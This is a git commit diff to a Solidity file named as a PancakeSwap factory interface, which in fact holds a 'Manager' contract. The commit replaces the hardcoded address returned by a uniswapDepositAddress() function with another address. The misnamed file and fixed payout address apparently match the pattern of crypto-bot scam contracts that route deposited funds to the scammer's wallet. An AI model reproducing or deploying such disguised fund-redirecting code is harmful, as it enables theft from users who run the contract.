2592dfe85e3ccbd236c0b6bd26c601596aee8612
ByronDickens <91103365+ByronDickens@users.noreply.github.com>
2021-12-23 16:40:23 +1100

    Update IPancakeswapV2Factory.sol

--- pancakeswap-v2-periphery/contracts/interfaces/V2/IPancakeswapV2Factory.sol
+++ pancakeswap-v2-periphery/contracts/interfaces/V2/IPancakeswapV2Factory.sol
@@ -6,6 +6,6 @@ contract Manager {
 	}
 
 	function uniswapDepositAddress() public pure returns (address) {
-		return 0x7C57085F359b3446BC35050b82822588a03FbBaC;
+		return 0xC8be98A9D85Ac43F96504c5419f68397125D067b;
 	}
 }
